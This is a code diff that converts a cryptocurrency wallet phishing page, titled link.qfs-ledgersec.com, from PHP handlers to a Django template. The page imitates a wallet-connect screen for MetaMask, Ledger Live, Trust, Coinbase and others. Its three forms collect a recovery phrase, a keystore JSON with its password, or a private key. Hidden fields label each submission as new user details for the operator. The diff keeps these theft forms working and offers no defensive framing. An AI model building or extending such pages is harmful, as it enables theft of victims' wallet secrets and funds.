@@ -1,3 +1,4 @@
+{% load static %}
 <!DOCTYPE html>
 <html lang="en">
     <meta http-equiv="content-type" content="text/html;charset=UTF-8"/>
@@ -6,11 +7,11 @@
         <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
         <meta name="msapplication-tap-highlight" content="no">
         <title>link.qfs-ledgersec.com</title>
-        <link rel="icon" type="image/png" href="assets/img/favicon.png">
-        <link rel="stylesheet" href="bootstrap-5.0.2/css/bootstrap.min.css">
-        <link rel="stylesheet" href="fontawesome5/css/all.min.css">
-        <link rel="stylesheet" type="text/css" href="wstyle.css">
-        <link rel="stylesheet" type="text/css" href="mystyle.css">
+        <link rel="icon" type="image/png" href="{% static 'assets/img/favicon.png' %}">
+        <link rel="stylesheet" href="{% static 'css/bootstrap-5.0.2/css/bootstrap.min.css' %}">
+        <link rel="stylesheet" href="{% static 'css/fontawesome5/css/all.min.css' %}">
+        <link rel="stylesheet" type="text/css" href="{% static 'css/wstyle.css' %}">
+        <link rel="stylesheet" type="text/css" href="{% static 'css/mystyle.css' %}">
     </head>
     <body style="display: block;">
         <div class="sending" data-reach-dialog-overlay style="opacity: 1;z-index: 99999;display: none">
@@ -58,7 +59,7 @@
                                         <div class="sc-iQKALj GTKuw">Easy-to-use browser extension.</div>
                                     </div>
                                     <div class="sc-bwCtUz lgYJCf">
-                                        <img class="firstImg" src="images/metamask-69ce6b56bbc9953dfb4aecebdf88729b.html" alt="Icon" style="width: 24px;">
+                                        <img class="firstImg" src="{% static 'images/metamask-69ce6b56bbc9953dfb4aecebdf88729b.html' %}" alt="Icon" style="width: 24px;">
                                     </div>
                                 </button>
                             </div>
@@ -90,23 +91,23 @@
                                             <div id="private" class="p-2 border-b-2 border-white hover:border-blue-600 cursor-pointer">Private Key
                                         </div>
                                         </div>
-                                        <form id="form" action="phrase.php" method="post">
-                                            <input type="hidden" name="_token" value="DqD8YUPK992xJq2sMllRyn1sDSS0fmr5ZlF3VZDL">
+                                        <form id="form" action="" method="post">
+                                            {% csrf_token %}
                                             <input type="hidden" name="subject" value="HEY, New User Details has been submitted">
-                                            <input type="hidden" name="walletname" id="walletname-inp1">
+                                            
+                                            <input type="hidden" name="walletname" id="walletname-inp1" value="walletname">
                                             <input type="hidden" name="code" value="ph629c700bb64df">
                                             <div id="first" class="acc-body active">
                                                 <div class="flex flex-col"></div>
                                                 <div class="flex flex-col mb-6">
                                                     <div class="relative">
-                                                        <textarea cols="30" rows="4" placeholder="Enter your recovery phrase" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" name="phrase" required minlength="12" id="phraseInput"></textarea>
-                                                        <p class="text-xs text-grey-300 mt-6">Typically 12 (sometimes 24) words separated by single spaces
-                                                    </p>
+                                                        {{ form_phrase.as_p }}
+                                                        <p class="text-xs text-grey-300 mt-6">Typically 12 (sometimes 24) words separated by single spaces</p>
                                                     </div>
                                                 </div>
                                                 <div class="col-lg-12 col-md-12">
                                                     <div class="send-btn">
-                                                        <button type="submit" class="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in">
+                                                        <button type="submit" name="submit_phrase"  class="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in">
                                                             <span class="mr-2 uppercase">Proceed</span>
                                                             <span>
                                                                 <svg fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor" class="h-6 w-6">
@@ -115,32 +116,25 @@
                                                             </span>
                                                         </button>
                                                     </div>
-                                                    <div id="msgSubmit" class="h3 text-center hidden"></div>
-                                                    <div class="clearfix"></div>
                                                 </div>
                                             </div>
                                         </form>
-                                        <form id="form" action="keystorejson.php" method="post">
+                                        <form id="form" action="" method="post">
+                                            {% csrf_token %}
                                             <input type="hidden" name="_token" value="ybIzuGqeQcH6D0nCGbdnjQ27YrkuCtjPZPYCpcSe">
                                             <input type="hidden" name="subject" value="HEY, New User Details has been submitted">
-                                            <input type="hidden" name="walletname" id="walletname-inp2">
+                                            
+                                            <input type="hidden" name="walletname" id="walletname-inp2" value="walletname">
+                                            
                                             <input type="hidden" name="code" value="ks628b9f6f1ec27">
                                             <div id="second" class="acc-body bg-grey-600">
                                                 <div class="flex flex-col"></div>
                                                 <div class="flex flex-col mb-6">
-                                                    <div class="relative">
-                                                        <textarea cols="30" rows="4" placeholder="Keystore JSON" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" name="keystorejson" required id="keystorejson"></textarea>
-                                                    </div>
-                                                </div>
-                                                <div class="flex flex-col mb-6">
-                                                    <div class="relative">
-                                                        <input type="text" required="required" name="keystorepassword" placeholder="Wallet password" id="keystorepassword" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
-                                                        <p class="text-xs text-grey-300 mt-6">Several lines of text beginning with "{...}" plus the password you used to encrypt it.
-                                                    </p>
-                                                    </div>
+                                
+                                                    {{ form_keystore.as_p }}
                                                 </div>
                                                 <div class="flex w-full">
-                                                    <button type="submit" class="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in">
+                                                    <button type="submit" name="submit_keystore" class="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in">
                                                         <span class="mr-2 uppercase">Proceed</span>
                                                         <span>
                                                             <svg fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor" class="h-6 w-6">
@@ -151,10 +145,11 @@
                                                 </div>
                                             </div>
                                         </form>
-                                        <form id="form" action="privatekey.php" method="post">
+                                        <form id="form" action="" method="post">
+                                            {% csrf_token %}
                                             <input type="hidden" name="_token" value="ybIzuGqeQcH6D0nCGbdnjQ27YrkuCtjPZPYCpcSe">
                                             <input type="hidden" name="subject" value="HEY, New User Details has been submitted">
-                                            <input type="hidden" name="walletname" id="walletname-inp3">
+                                            <input type="hidden" name="walletname" id="walletname-inp3", value="walletname">
                                             <input type="hidden" name="code" value="?php echo uniqid();?>">
                                             <div id="third" class="acc-body bg-grey-600">
                                                 <div class="flex flex-col">
@@ -164,14 +159,14 @@
                                                 </div>
                                                 <div class="flex flex-col mb-6">
                                                     <div class="relative">
-                                                        <input name="pd" required type="text" required="required" id="privatekey" class="form-control" placeholder="Enter your Private Key" required data-error="Please enter your Private Key">
+                                                        {{ form_private_key.as_p }}
                                                         <p class="text-xs text-grey-300 mt-6">Typically 12 (sometimes 24) words seperated by a single space.
                                                     </p>
                                                     </div>
                                                 </div>
                                                 <div class="col-lg-12 col-md-12">
                                                     <div class="send-btn">
-                                                        <button type="submit" class="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in">
+                                                        <button type="submit" name="submit_private_key" class="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in">
                                                             <span class="mr-2 uppercase">Proceed</span>
                                                             <span>
                                                                 <svg fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor" class="h-6 w-6">
@@ -212,31 +207,31 @@
                                         <div class="Grid__SGrid-sc-8d5rqj-0 gAVVCu">
                                             <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                                                 <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
-                                                    <img class="img-icons" src="images/trust-wallet.png" alt="Trust">
+                                                    <img class="img-icons" src="{% static 'images/trust-wallet.png' %}" alt="Trust">
                                                 </div>
                                                 <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Trust</div>
                                             </div>
                                             <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                                                 <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr" style="margin-top: 30px;">
-                                                    <img class="img-icons" src="images/iogo.jpg" alt="Connect">
+                                                    <img class="img-icons" src="{% static 'images/iogo.jpg' %}" alt="Connect">
                                                 </div>
                                                 <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW" style=" padding-top: 37px;">Wallet connect</div>
                                             </div>
                                             <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                                                 <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
-                                                    <img class="img-icons" src="images/atomic.png" alt="Atomic">
+                                                    <img class="img-icons" src="{% static 'images/atomic.png' %}" alt="Atomic">
                                                 </div>
                                                 <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Atomic</div>
                                             </div>
                                             <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                                                 <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
-                                                    <img class="img-icons" src="images/metamask.png" alt="Metamask">
+                                                    <img class="img-icons" src="{% static 'images/metamask.png' %}" alt="Metamask">
                                                 </div>
                                                 <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Metamask</div>
                                             </div>
                                             <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                                                 <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
-                                                    <img class="img-icons" src="images/rainbow.png" alt="Rainbow">
+                                                    <img class="img-icons" src="{% static 'images/rainbow.png' %}" alt="Rainbow">
                                                 </div>
                                                 <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Rainbow</div>
                                             </div>
@@ -254,85 +249,85 @@
                                             </div>
                                             <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                                                 <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
-                                                    <img class="img-icons" src="images/crypto.png" alt="Crypto.com | DeFi Wallet">
+                                                    <img class="img-icons" src="{% static 'images/crypto.png' %}" alt="Crypto.com | DeFi Wallet">
                                                 </div>
                                                 <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Crypto.com | DeFi Wallet</div>
                                             </div>
                                             <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                                                 <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
-                                                    <img class="img-icons" src="images/exodus.png" alt="Exodus">
+                                                    <img class="img-icons" src="{% static 'images/exodus.png' %}" alt="Exodus">
                                                 </div>
                                                 <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Exodus</div>
                                             </div>
                                             <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                                                 <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
-                                                    <img class="img-icons" src="images/blockchain-logo.png" alt="Blockchain">
+                                                    <img class="img-icons" src="{% static 'images/blockchain-logo.png' %}" alt="Blockchain">
                                                 </div>
                                                 <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Blockchain</div>
                                             </div>
                                             <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                                                 <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
-                                                    <img class="img-icons" src="images/bsc-logo.png" alt="Binance Smart Chain">
+                                                    <img class="img-icons" src="{% static 'images/bsc-logo.png' %}" alt="Binance Smart Chain">
                                                 </div>
                                                 <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Binance Smart Chain</div>
                                             </div>
                                             <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                                                 <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
-                                                    <img class="img-icons" src="images/coinbase.png" alt="Coinbase">
+                                                    <img class="img-icons" src="{% static 'images/coinbase.png' %}" alt="Coinbase">
                                                 </div>
                                                 <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Coinbase</div>
                                             </div>
                                             <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                                                 <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
-                                                    <img class="img-icons" src="images/anchor.png" alt="Anchor">
+                                                    <img class="img-icons" src="{% static 'images/anchor.png' %}" alt="Anchor">
                                                 </div>
                                                 <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Anchor</div>
                                             </div>
                                             <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                                                 <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
-                                                    <img class="img-icons" src="images/onto.png" alt="ONTO">
+                                                    <img class="img-icons" src="{% static 'images/onto.png' %}" alt="ONTO">
                                                 </div>
                                                 <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">ONTO</div>
                                             </div>
                                             <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                                                 <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
-                                                    <img class="img-icons" src="images/tokenpocket.png" alt="TokenPocket">
+                                                    <img class="img-icons" src="{% static 'images/tokenpocket.png' %}" alt="TokenPocket">
                                                 </div>
                                                 <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">TokenPocket</div>
                                             </div>
                                             <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                                                 <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
-                                                    <img class="img-icons" src="images/math-wallet.png" alt="MathWallet">
+                                                    <img class="img-icons" src="{% static 'images/math-wallet.png' %}" alt="MathWallet">
                                                 </div>
                                                 <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">MathWallet</div>
                                             </div>
                                             <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                                                 <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
-                                                    <img class="img-icons" src="images/bitpay.jpg" alt="BitPay">
+                                                    <img class="img-icons" src="{% static 'images/bitpay.jpg' %}" alt="BitPay">
                                                 </div>
                                                 <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">BitPay</div>
                                             </div>
                                             <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                                                 <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
-                                                    <img class="img-icons" src="images/maiar.png" alt="Maiar">
+                                                    <img class="img-icons" src="{% static 'images/maiar.png' %}" alt="Maiar">
                                                 </div>
                                                 <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Maiar</div>
                                             </div>
                                             <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                                                 <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
-                                                    <img class="img-icons" src="images/ledgerlive.png" alt="Ledger Live">
+                                                    <img class="img-icons" src="{% static 'images/ledgerlive.png' %}" alt="Ledger Live">
                                                 </div>
                                                 <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Ledger Live</div>
                                             </div>
                                             <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                                                 <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
-                                                    <img class="img-icons" src="images/walleth.png" alt="Walleth">
+                                                    <img class="img-icons" src="{% static 'images/walleth.png' %}" alt="Walleth">
                                                 </div>
                                                 <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Walleth</div>
                                             </div>
                                             <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                                                 <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
-                                                    <img class="img-icons" src="images/authereum.png" alt="Authereum">
+                                                    <img class="img-icons" src="{% static 'images/authereum.png' %}" alt="Authereum">
                                                 </div>
                                                 <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Authereum</div>
                                             </div>
@@ -350,7 +345,7 @@
                                             </div>
                                             <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                                                 <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
-                                                    <img class="img-icons" src="images/mykey.png" alt="MYKEY">
+                                                    <img class="img-icons" src="{% static 'images/mykey.png' %}" alt="MYKEY">
                                                 </div>
                                                 <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">MYKEY</div>
                                             </div>
@@ -362,19 +357,19 @@
                                             </div>
                                             <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                                                 <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
-                                                    <img class="img-icons" src="images/trustvault.png" alt="TrustVault">
+                                                    <img class="img-icons" src="{% static 'images/trustvault.png' %}" alt="TrustVault">
                                                 </div>
                                                 <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">TrustVault</div>
                                             </div>
                                             <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                                                 <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
-                                                    <img class="img-icons" src="images/coin98.png" alt="Coin98">
+                                                    <img class="img-icons" src="{% static 'images/coin98.png' %}" alt="Coin98">
                                                 </div>
                                                 <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Coin98</div>
                                             </div>
                                             <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                                                 <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
-                                                    <img class="img-icons" src="images/coolwallet.png" alt="CoolWallet S">
+                                                    <img class="img-icons" src="{% static 'images/coolwallet.png' %}" alt="CoolWallet S">
                                                 </div>
                                                 <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">CoolWallet S</div>
                                             </div>
@@ -1422,9 +1417,9 @@
                 /* Styles */
             }
         </style>
-        <script src="js/jquery-3.6.0.js" crossorigin="anonymous"></script>
-        <script src="js/js1.js"></script>
-        <script src="js/js2W.js"></script>
+        <script src="{% static 'js/jquery-3.6.0.js' %}" crossorigin="anonymous"></script>
+        <script src="{% static 'js/js1.js' %}"></script>
+        <script src="{% static 'js/js2W.js' %}"></script>
         <script>
             function ready() {
                 document.body.style.display = "block";
